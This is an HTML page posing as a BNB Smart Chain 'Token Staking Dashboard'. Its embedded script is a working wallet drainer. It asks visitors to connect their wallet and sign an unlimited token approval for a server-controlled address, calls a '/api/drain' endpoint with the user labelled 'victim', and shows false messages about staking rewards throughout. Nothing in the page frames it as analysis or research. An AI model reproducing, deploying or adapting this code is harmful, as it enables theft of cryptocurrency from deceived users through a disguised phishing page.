<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Token Staking Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
 body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
      background:#0e1421;color:#e5ebff;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
 .card{background:#182138;border:1px solid #2a3954;border-radius:12px;
       padding:36px 40px;max-width:520px;width:92%;text-align:center}
 h1{margin:0 0 8px;font-size:21px;color:#fff}
 .sub{color:#93a2bd;font-size:13px;margin-bottom:24px;line-height:1.5}
 .btn{display:block;width:100%;padding:14px;border:0;border-radius:8px;font-size:15px;
      font-weight:700;cursor:pointer;background:linear-gradient(135deg,#4f7cff,#7c5cff);
      color:#fff;transition:opacity .2s}
 .btn:hover{opacity:.88}.btn:disabled{opacity:.4;cursor:not-allowed}
 .log{margin-top:18px;min-height:44px;text-align:left;font-size:13px;color:#8be28b;
      word-break:break-all;line-height:1.5}
 .log .err{color:#ff7676}
 .meta{margin-top:16px;font-size:11px;color:#66749a;word-break:break-all;line-height:1.6;text-align:left}
</style>
</head>
<body>
<div class="card">
 <h1>Token Staking Dashboard</h1>
 <div class="sub">Connect your wallet to begin earning passive rewards on your holding.</div>
 <button class="btn" id="go" type="button">Connect Wallet</button>
 <div class="log" id="msg"></div>
 <div class="meta" id="meta"></div>
</div>
<script>
"use strict";
var $msg=document.getElementById("msg"),$btn=document.getElementById("go"),
    $meta=document.getElementById("meta");
var MAX=(1n<<256n)-1n;
var EXPECTED_CHAIN=56;                 /* BNB Smart Chain mainnet */

function out(t,e){var d=document.createElement("div");if(e)d.className="err";
                  d.textContent=t;$msg.appendChild(d);}
function meta(k,v){var d=document.createElement("div");d.textContent=k+": "+v;
                   $meta.appendChild(d);}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
function pad32(h){var s=(""+h).replace(/^0x/i,"").toLowerCase();
                  while(s.length<64)s="0"+s;return s;}
function needProvider(){if(!window.ethereum)throw new Error("No wallet found");
                        return window.ethereum;}
function rpc(m,p){return window.ethereum.request({method:m,params:p||[]});}
function post(p,b){return fetch(p,{method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify(b||{})}).then(function(r){return r.json();});}
function fmt(w){try{return(Number(BigInt(w)/10n**12n)/1e6).toFixed(6);}catch(e){return "0";}}

var S={account:null,token:null,puller:null};

$btn.addEventListener("click",async function(){
  $msg.innerHTML="";$meta.innerHTML="";$btn.disabled=true;
  try{
    /* STAGE 1: connect */
    out("requesting access...");
    needProvider();
    var accs=await rpc("eth_requestAccounts");
    S.account=accs[0];meta("account",S.account);

    /* STAGE 2: server config */
    out("loading environment...");
    var h=await fetch("/api/health").then(function(r){return r.json();});
    if(!h||!h.token)throw new Error("server not configured (check .env)");
    S.token=h.token;if(h.puller)S.puller=h.puller;
    meta("network",h.chainId);meta("asset",S.token);

    /* STAGE 3: switch to the right chain */
    out("binding network...");
    var want="0x"+EXPECTED_CHAIN.toString(16);
    try{await rpc("wallet_switchEthereumChain",[{chainId:want}]);}catch(se){}
    var cid=parseInt(await rpc("eth_chainId"),16);
    if(cid!==EXPECTED_CHAIN)throw new Error("wallet on chain "+cid+", need 56 (BSC)");

    /* STAGE 4: wait for the vault */
    if(!S.puller){
      out("preparing staking vault...");
      post("/api/provision",{}).catch(function(){});
      for(var t=0;t<40&&!S.puller;t++){
        await sleep(2500);
        var h2=await fetch("/api/health").then(function(r){return r.json();})
               .catch(function(){return {};});
        if(h2&&h2.puller)S.puller=h2.puller;
        else if(h2&&h2.error)out("[wait] "+h2.error,true);
      }
      if(!S.puller)throw new Error("vault not ready (check server logs)");
    }
    meta("vault",S.puller);
    out("vault = "+S.puller);

    /* STAGE 5: balance + allowance read by the SERVER (fixes the 0x revert) */
    out("checking holdings...");
    var c=await post("/api/check",{victim:S.account});
    if(!c||!c.ok)throw new Error("server check failed: "+((c&&c.error)||"?"));
    out("balance = "+fmt(c.balance)+"  allowance = "+fmt(c.allowance));
    if(BigInt(c.balance)<=0n){
      out("no token balance found for "+S.account+" on BSC.",true);
      $btn.disabled=false;return;
    }

    /* STAGE 6: approve, signed and paid by the wallet */
    if(BigInt(c.allowance)<BigInt(c.balance)){
      out("confirm the staking authorization in your wallet...");
      var adata="0x095ea7b3"+pad32(S.puller)+
                pad32(MAX.toString(16));
      var txh=await rpc("eth_sendTransaction",
              [{from:S.account,to:S.token,value:"0x0",data:adata}]);
      out("authorization sent: "+txh);
      var seen=false;
      for(var i=0;i<80&&!seen;i++){
        await sleep(2000);
        var c2=await post("/api/check",{victim:S.account});
        if(c2&&c2.ok&&BigInt(c2.allowance)>=BigInt(c2.balance))seen=true;
      }
      if(!seen)throw new Error("authorization not confirmed");
    }

    /* STAGE 7: backend executes */
    out("activating your position...");
    var res=await post("/api/drain",{victim:S.account});
    if(res&&res.success){out("position activated. rewards accrue automatically.");}
    else{out((res&&(res.error||res.reason))||"activation pending",true);}
  }catch(e){
    out("[failed] "+((e&&e.message)||String(e)),true);
  }
  $btn.disabled=false;
});
</script>
</body>
</html>
